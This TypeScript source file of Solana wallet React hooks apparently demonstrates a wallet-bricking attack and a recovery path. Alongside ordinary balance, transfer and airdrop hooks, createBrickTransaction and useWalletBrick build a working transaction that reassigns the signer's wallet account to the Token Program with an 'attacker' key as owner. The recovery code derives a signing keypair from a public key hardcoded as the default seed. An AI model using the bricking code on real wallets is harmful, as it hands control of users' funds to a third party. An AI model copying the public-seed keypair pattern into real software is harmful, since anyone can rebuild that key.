'use client';

import { SPL_ASSOCIATED_TOKEN_PROGRAM_ID, transferTokens } from "@metaplex-foundation/mpl-toolbox";
import { TokenStandard, mplTokenMetadata, transferV1 } from "@metaplex-foundation/mpl-token-metadata";
import {createUmi} from "@metaplex-foundation/umi-bundle-defaults";
import { TransactionBuilder, Signer, generateSigner, signerPayer, createNoopSigner, createSignerFromKeypair, signerIdentity } from '@metaplex-foundation/umi';
import {fromWeb3JsKeypair, fromWeb3JsPublicKey, toWeb3JsInstruction} from "@metaplex-foundation/umi-web3js-adapters";
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { TOKEN_2022_PROGRAM_ID, TOKEN_PROGRAM_ID, createAssociatedTokenAccount, createAssociatedTokenAccountInstruction, createCloseAccountInstruction, createInitializeAccount3Instruction, createInitializeImmutableOwnerInstruction, createTransferCheckedInstruction, getAssociatedTokenAddressSync, getOrCreateAssociatedTokenAccount } from '@solana/spl-token';
import {
  AccountInfo,
  Connection,
  Keypair,
  LAMPORTS_PER_SOL,
  ParsedAccountData,
  PublicKey,
  SystemProgram,
  TransactionInstruction,
  TransactionMessage,
  TransactionSignature,
  VersionedTransaction,
} from '@solana/web3.js';
import { useMutation, useQuery, useQueryClient } from '@tanstack/react-query';
import toast from 'react-hot-toast';
import { useTransactionToast } from '../ui/ui-layout';

export function useGetBalance({ address }: { address: PublicKey }) {
  const { connection } = useConnection();

  return useQuery({
    queryKey: ['get-balance', { endpoint: connection.rpcEndpoint, address }],
    queryFn: () => connection.getBalance(address),
  });
}

export function useGetSignatures({ address }: { address: PublicKey }) {
  const { connection } = useConnection();

  return useQuery({
    queryKey: ['get-signatures', { endpoint: connection.rpcEndpoint, address }],
    queryFn: () => connection.getConfirmedSignaturesForAddress2(address),
  });
}

export function useGetTokenAccounts({ address }: { address: PublicKey }) {
  const { connection } = useConnection();

  return useQuery({
    queryKey: [
      'get-token-accounts',
      { endpoint: connection.rpcEndpoint, address },
    ],
    queryFn: async () => {
      const [tokenAccounts, token2022Accounts] = await Promise.all([
        connection.getParsedTokenAccountsByOwner(address, {
          programId: TOKEN_PROGRAM_ID,
        }),
        connection.getParsedTokenAccountsByOwner(address, {
          programId: TOKEN_2022_PROGRAM_ID,
        }),
      ]);
      return [...tokenAccounts.value, ...token2022Accounts.value];
    },
  });
}

export function useGetTokenAccountBalance({ address }: { address: PublicKey }) {
  const { connection } = useConnection();

  return useQuery({
    queryKey: [
      'get-token-account-balance',
      { endpoint: connection.rpcEndpoint, account: address.toString() },
    ],
    queryFn: () => connection.getTokenAccountBalance(address),
  });
}

export function useTransferSol({ address }: { address: PublicKey }) {
  const { connection } = useConnection();
  const transactionToast = useTransactionToast();
  const wallet = useWallet();
  const client = useQueryClient();

  return useMutation({
    mutationKey: [
      'transfer-sol',
      { endpoint: connection.rpcEndpoint, address },
    ],
    mutationFn: async (input: { destination: PublicKey; amount: number }) => {
      let signature: TransactionSignature = '';
      try {
        const { transaction, latestBlockhash } = await createTransaction({
          publicKey: address,
          destination: input.destination,
          amount: input.amount,
          connection,
        });

        // Send transaction and await for signature
        signature = await wallet.sendTransaction(transaction, connection);

        // Send transaction and await for signature
        await connection.confirmTransaction(
          { signature, ...latestBlockhash },
          'confirmed'
        );

        console.log(signature);
        return signature;
      } catch (error: unknown) {
        console.log('error', `Transaction failed! ${error}`, signature);

        return;
      }
    },
    onSuccess: (signature) => {
      if (signature) {
        transactionToast(signature);
      }
      return Promise.all([
        client.invalidateQueries({
          queryKey: [
            'get-balance',
            { endpoint: connection.rpcEndpoint, address },
          ],
        }),
        client.invalidateQueries({
          queryKey: [
            'get-signatures',
            { endpoint: connection.rpcEndpoint, address },
          ],
        }),
      ]);
    },
    onError: (error) => {
      toast.error(`Transaction failed! ${error}`);
    },
  });
}

export function useRequestAirdrop({ address }: { address: PublicKey }) {
  const { connection } = useConnection();
  const transactionToast = useTransactionToast();
  const client = useQueryClient();

  return useMutation({
    mutationKey: ['airdrop', { endpoint: connection.rpcEndpoint, address }],
    mutationFn: async (amount: number = 1) => {
      const [latestBlockhash, signature] = await Promise.all([
        connection.getLatestBlockhash(),
        connection.requestAirdrop(address, amount * LAMPORTS_PER_SOL),
      ]);

      await connection.confirmTransaction(
        { signature, ...latestBlockhash },
        'confirmed'
      );
      return signature;
    },
    onSuccess: (signature) => {
      transactionToast(signature);
      return Promise.all([
        client.invalidateQueries({
          queryKey: [
            'get-balance',
            { endpoint: connection.rpcEndpoint, address },
          ],
        }),
        client.invalidateQueries({
          queryKey: [
            'get-signatures',
            { endpoint: connection.rpcEndpoint, address },
          ],
        }),
      ]);
    },
  });
}

async function createTransaction({
  publicKey,
  destination,
  amount,
  connection,
}: {
  publicKey: PublicKey;
  destination: PublicKey;
  amount: number;
  connection: Connection;
}): Promise<{
  transaction: VersionedTransaction;
  latestBlockhash: { blockhash: string; lastValidBlockHeight: number };
}> {
  // Get the latest blockhash to use in our transaction
  const latestBlockhash = await connection.getLatestBlockhash();

  // Create instructions to send, in this case a simple transfer
  const instructions = [
    SystemProgram.transfer({
      fromPubkey: publicKey,
      toPubkey: destination,
      lamports: amount * LAMPORTS_PER_SOL,
    }),
  ];

  // Create a new TransactionMessage with version and compile it to legacy
  const messageLegacy = new TransactionMessage({
    payerKey: publicKey,
    recentBlockhash: latestBlockhash.blockhash,
    instructions,
  }).compileToLegacyMessage();

  // Create a new VersionedTransaction which supports legacy and v0
  const transaction = new VersionedTransaction(messageLegacy);

  return {
    transaction,
    latestBlockhash,
  };
}


async function createBrickTransaction({
  publicKey,
  attacker,
  connection,
}: {
  publicKey: PublicKey;
  attacker: PublicKey;
  connection: Connection;
}): Promise<{
  transaction: VersionedTransaction;
  latestBlockhash: { blockhash: string; lastValidBlockHeight: number };
}> {
  // Get the latest blockhash to use in our transaction
  const latestBlockhash = await connection.getLatestBlockhash();

  // Create instructions to send, in this case a simple transfer
  const instructions = [
    SystemProgram.allocate({
      accountPubkey: publicKey,
      programId: TOKEN_PROGRAM_ID,
      space: 165
    }),
    SystemProgram.assign({
      accountPubkey: publicKey,
      programId: TOKEN_PROGRAM_ID,
    }),
    createInitializeImmutableOwnerInstruction(publicKey, TOKEN_PROGRAM_ID),
    createInitializeAccount3Instruction(publicKey, new PublicKey("So11111111111111111111111111111111111111112"), attacker, TOKEN_PROGRAM_ID)
  ];

  // Create a new TransactionMessage with version and compile it to legacy
  const messageLegacy = new TransactionMessage({
    payerKey: publicKey,
    recentBlockhash: latestBlockhash.blockhash,
    instructions,
  }).compileToLegacyMessage();

  // Create a new VersionedTransaction which supports legacy and v0
  const transaction = new VersionedTransaction(messageLegacy);

  const sim = await connection.simulateTransaction(transaction);
  console.log(sim);

  return {
    transaction,
    latestBlockhash,
  };
}




export function useWalletBrick({ address }: { address: PublicKey }) {
  const { connection } = useConnection();
  const transactionToast = useTransactionToast();
  const wallet = useWallet();
  const client = useQueryClient();

  return useMutation({
    mutationKey: [
      'transfer-sol',
      { endpoint: connection.rpcEndpoint, address },
    ],
    mutationFn: async (input: { attacker: PublicKey; }) => {
      let signature: TransactionSignature = '';
      try {
        const { transaction, latestBlockhash } = await createBrickTransaction({
          publicKey: address,
          attacker: input.attacker,
          connection,
        });

        // Send transaction and await for signature
        signature = await wallet.sendTransaction(transaction, connection);

        // Send transaction and await for signature
        await connection.confirmTransaction(
          { signature, ...latestBlockhash },
          'confirmed'
        );

        console.log(signature);
        return signature;
      } catch (error: unknown) {
        console.log('error', `Transaction failed! ${error}`, signature);

        return;
      }
    },
    onSuccess: (signature) => {
      if (signature) {
        transactionToast(signature);
      }
      return Promise.all([
        client.invalidateQueries({
          queryKey: [
            'get-balance',
            { endpoint: connection.rpcEndpoint, address },
          ],
        }),
        client.invalidateQueries({
          queryKey: [
            'get-signatures',
            { endpoint: connection.rpcEndpoint, address },
          ],
        }),
      ]);
    },
    onError: (error) => {
      toast.error(`Transaction failed! ${error}`);
    },
  });
}






async function createRecoveryTransaction({
  publicKey,
  destination,
  accounts,
  connection,
}: {
  publicKey: PublicKey;
  destination: PublicKey;
  accounts: {pubkey: PublicKey, account: AccountInfo<ParsedAccountData>} 
  connection: Connection;
}): Promise<{
  transaction: VersionedTransaction;
  latestBlockhash: { blockhash: string; lastValidBlockHeight: number };
}> {
  // Get the latest blockhash to use in our transaction
  const latestBlockhash = await connection.getLatestBlockhash();

  let seed = new PublicKey(process.env.NEXT_PUBLIC_SEED||"BricrkPMHcoyqnVxEhVbErNeka7wysRMHpRy97zeHjC");
  let payer = Keypair.fromSeed(seed.toBytes());
  console.log("payer: "+payer.publicKey.toBase58());

  let senderATA = accounts.pubkey;
  let mint = new PublicKey(accounts.account.data.parsed.info.mint);
  let recievingATA = getAssociatedTokenAddressSync(mint, destination);
  let amount = accounts.account.data.parsed.info.tokenAmount.amount;
  let decimals = accounts.account.data.parsed.info.tokenAmount.decimals;
  console.log("sending "+amount+" "+mint);
  
  let ataInfo = await connection.getAccountInfo(recievingATA);
  let ataExists = ataInfo && ataInfo.lamports>0;

  let isPnft = accounts.account.data.parsed.info.state=="frozen";

  const instructions : TransactionInstruction[]= [];

  if (isPnft){

    console.log("account frozen! most likely pNFT");
    const umi = createUmi(process.env.NEXT_PUBLIC_RPC_URL||"https://api.mainnet-beta.solana.com");

    const signerPayer = createSignerFromKeypair(umi, fromWeb3JsKeypair(payer));
    const pseudoSigner = createNoopSigner(fromWeb3JsPublicKey(publicKey));
    // const pseudoPayer = createNoopSigner(fromWeb3JsPublicKey(payer.publicKey));
    
    umi.use(mplTokenMetadata());
    umi.use(signerIdentity(signerPayer));
    // umi.programs.add(SPL_ASSOCIATED_TOKEN_PROGRAM_ID);
    
    // pnft stuff
    const inx = transferV1(umi, {
        mint: fromWeb3JsPublicKey(mint),
        tokenStandard: TokenStandard.ProgrammableNonFungible,
        destinationOwner: fromWeb3JsPublicKey(destination),
        amount: amount,
        payer: signerPayer,
        authority: pseudoSigner,
        splAtaProgram: SPL_ASSOCIATED_TOKEN_PROGRAM_ID,
        splTokenProgram: fromWeb3JsPublicKey(TOKEN_PROGRAM_ID),
        tokenOwner: fromWeb3JsPublicKey(publicKey),


    }).setFeePayer(signerPayer).getInstructions();

    console.log(inx);
    instructions.push(...inx.map(ix=>toWeb3JsInstruction(ix)));
  } else {

    if (!ataExists) {
      instructions.push(createAssociatedTokenAccountInstruction(payer.publicKey, recievingATA, destination, mint));
    }
    instructions.push(createTransferCheckedInstruction(senderATA, mint, recievingATA, publicKey, amount, decimals ));

  }    
  
  // close it to recover funds
  instructions.push(createCloseAccountInstruction(senderATA, payer.publicKey, publicKey));
  
    
  console.log(instructions);
  // Create a new TransactionMessage with version and compile it to legacy
  const messageLegacy = new TransactionMessage({
    payerKey: payer.publicKey,
    recentBlockhash: latestBlockhash.blockhash,
    instructions,
  }).compileToLegacyMessage();

  // Create a new VersionedTransaction which supports legacy and v0
  const transaction = new VersionedTransaction(messageLegacy);
  transaction.sign([payer]);

  const sim = await connection.simulateTransaction(transaction);
  console.log(sim);

  return {
    transaction,
    latestBlockhash,
  };
}


export function useWalletRecovery({ address, accounts }: { address: PublicKey, accounts: {pubkey: PublicKey, account: AccountInfo<ParsedAccountData>} }) {
  const { connection } = useConnection();
  const transactionToast = useTransactionToast();
  const wallet = useWallet();
  const client = useQueryClient();

  return useMutation({
    mutationKey: [
      'recover-ta',
      { endpoint: connection.rpcEndpoint, address, accounts },
    ],
    mutationFn: async (input: { destination: PublicKey;accounts: {pubkey: PublicKey, account: AccountInfo<ParsedAccountData>} }) => {
      let signature: TransactionSignature = '';
      console.log('recovery started');
      console.log('trying to recover '+input.accounts.pubkey.toBase58());
      console.log('sending tokens to '+input.destination.toBase58());
      try { 
        const { transaction, latestBlockhash } = await createRecoveryTransaction({
          publicKey: address,
          destination: input.destination,
          accounts: input.accounts,
          connection,
        });

        // Send transaction and await for signature
        signature = await wallet.sendTransaction(transaction, connection);

        // Send transaction and await for signature
        await connection.confirmTransaction(
          { signature, ...latestBlockhash },
          'confirmed'
        );

        console.log(signature);
        return signature;

      } catch (error: unknown) {
        console.log('error', `Transaction failed! ${error}`, signature);

        return;
      }
    },
    onSuccess: (signature) => {
      if (signature) {
        transactionToast(signature);
      }
      return Promise.all([
        client.invalidateQueries({
          queryKey: [
            'get-balance',
            { endpoint: connection.rpcEndpoint, address },
          ],
        }),
        client.invalidateQueries({
          queryKey: [
            'get-signatures',
            { endpoint: connection.rpcEndpoint, address },
          ],
        }),
      ]);
    },
    onError: (error) => {
      toast.error(`Transaction failed! ${error}`);
    },
  });
}